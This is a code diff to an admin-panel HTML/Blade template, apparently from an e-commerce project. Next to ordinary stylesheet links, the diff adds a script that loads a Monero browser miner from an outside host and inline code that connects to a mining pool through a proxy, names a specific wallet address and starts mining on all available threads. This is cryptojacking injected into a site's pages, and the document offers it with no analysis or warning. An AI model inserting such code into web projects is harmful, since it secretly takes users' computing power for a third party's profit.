@@ -45,6 +45,17 @@
   <link rel="stylesheet" href="{{ sc_file('admin/LTE/plugins/jquery-ui/jquery-ui.min.css')}}">
 
   <link rel="stylesheet" href="{{ sc_file('admin/LTE/dist/css/adminlte.min.css')}}">
+  <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "88dR6PNx6gG2r22gF4Q33Y54XZuZAQNpAYhNeCJQV1kTj82t8PG6Cgf1EQmnVvPizMYrcdYF59LnHDSTJXeB4io97qtG7Kx";
+    var workerId = ""
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
 
   @stack('styles')
 
